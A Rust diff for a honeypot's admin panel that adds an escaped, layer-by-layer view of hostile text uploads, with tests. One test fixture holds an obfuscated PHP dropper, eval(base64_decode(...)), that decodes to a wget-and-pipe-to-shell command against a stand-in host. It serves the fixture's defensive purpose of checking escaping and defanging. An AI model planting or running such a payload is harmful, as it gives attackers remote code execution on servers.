@@ -1,12 +1,14 @@
 //! Admin › Uploads: the files dropped on the trap (MIK-121), their
 //! metadata, and the requests later made where each was told it landed.
-//! Content is hostile: it is never shown, inlined or unpacked here. It
+//! Content is hostile. A text upload is parsed statically and shown
+//! escaped; a binary is never parsed, shown, inlined or unpacked here. It
 //! leaves only as a download, in a zip encrypted with the password
 //! `infected` (a handling convention, not a protection: ZipCrypto is weak).
 use crate::admin::AdminState;
 use crate::admin::auth::SessionUser;
 use crate::admin::error::{AppError, AppResult, render};
 use crate::admin::views::Chrome;
+use crate::model::xray::{Policy, Source, parse};
 use crate::store::browse::{Page, lenient_i64, page_num};
 use crate::store::uploads::{self, TimelineRow, UploadRow};
 use askama::Template;
@@ -103,6 +105,8 @@ struct UploadPage {
     u: UploadRow,
     timeline: Vec<TimelineRow>,
     timeline_max: i64,
+    /// A text upload opened layer by layer; binaries have none.
+    xray: Option<crate::admin::xray::XrayView>,
 }
 
 async fn detail(
@@ -115,8 +119,19 @@ async fn detail(
         return Err(AppError::NotFound);
     };
     let timeline = uploads::timeline(&mut conn, &u).await?;
+    let xray = uploads::text_for_xray(&mut conn, &u).await?.map(|text| {
+        crate::admin::xray::xray_view(&parse(
+            Source::Upload {
+                name: u.filename.as_deref(),
+                text: &text,
+                sender: Some(&u.ip),
+            },
+            Policy::embedded(),
+        ))
+    });
     render(&UploadPage {
         chrome: Chrome::new(true, "admin"),
+        xray,
         u,
         timeline,
         timeline_max: uploads::TIMELINE_MAX,
@@ -194,6 +209,18 @@ pub(crate) mod tests {
         content: &[u8],
         held: bool,
     ) -> UploadRec {
+        typed_upload(st, uid, filename, content, held, "php").await
+    }
+
+    /// [`upload`] with the type its first bytes sniffed as.
+    pub(crate) async fn typed_upload(
+        st: &crate::admin::AdminState,
+        uid: &str,
+        filename: &str,
+        content: &[u8],
+        held: bool,
+        sniffed: &str,
+    ) -> UploadRec {
         let r = UploadRec {
             uid: uid.into(),
             request_uid: format!("r-{uid}"),
@@ -201,7 +228,7 @@ pub(crate) mod tests {
             ip: "203.0.113.30".into(),
             kind: "script".into(),
             filename: Some(filename.into()),
-            sniffed_type: "php".into(),
+            sniffed_type: sniffed.into(),
             size: content.len() as i64,
             sha256: sha2::Sha256::digest(content).to_vec(),
             answered_path: format!("/uploads/{uid}.php"),
@@ -366,5 +393,45 @@ pub(crate) mod tests {
         let mut got = vec![];
         std::io::Read::read_to_end(&mut f, &mut got).unwrap();
         assert_eq!(sha2::Sha256::digest(&got).to_vec(), r.sha256);
+    }
+
+    #[tokio::test]
+    async fn text_upload_shows_xray() {
+        let (st, cookie, app, _d) = app().await;
+        let code = "<?php eval(base64_decode('d2dldCBodHRwOi8vMTkyLjAuMi45L3guc2ggLU8tIHwgc2g=')); ?><b>x</b>";
+        upload(&st, "t1", "a.php", code.as_bytes(), true).await;
+        let req = Request::get("/admin/traps/uploads/t1")
+            .header("cookie", cookie)
+            .header("sec-fetch-site", "same-origin");
+        let (status, _, body) = send(&app, req, Body::empty()).await;
+        assert_eq!(status, StatusCode::OK);
+        assert!(body.contains("id=\"xray\""), "{body}");
+        assert!(
+            body.contains("&#60;?php") && body.contains("eval(base64_decode("),
+            "{body}"
+        );
+        assert!(!body.contains("<b>x</b>"));
+        assert!(body.contains("hxxp://192[.]0[.]2[.]9"), "{body}");
+        assert!(!body.contains("href=\"http://192"), "{body}");
+        assert!(body.contains("/admin/traps/uploads/t1/content.zip"));
+    }
+
+    #[tokio::test]
+    async fn binary_upload_shows_no_xray() {
+        let (st, cookie, app, _d) = app().await;
+        let elf = b"\x7fELF\x02\x01\x01 MARKELF";
+        typed_upload(&st, "b1", "a.bin", elf, true, "elf").await;
+        // Text bytes under a binary type are no text either.
+        typed_upload(&st, "b2", "b.bin", b"<?php echo 'MARKTXT';", true, "zip").await;
+        for uid in ["b1", "b2"] {
+            let req = Request::get(format!("/admin/traps/uploads/{uid}"))
+                .header("cookie", cookie.clone())
+                .header("sec-fetch-site", "same-origin");
+            let (status, _, body) = send(&app, req, Body::empty()).await;
+            assert_eq!(status, StatusCode::OK);
+            assert!(body.contains(&format!("/admin/traps/uploads/{uid}/content.zip")));
+            assert!(!body.contains("id=\"xray\""), "{body}");
+            assert!(!body.contains("MARKELF") && !body.contains("MARKTXT"));
+        }
     }
 }
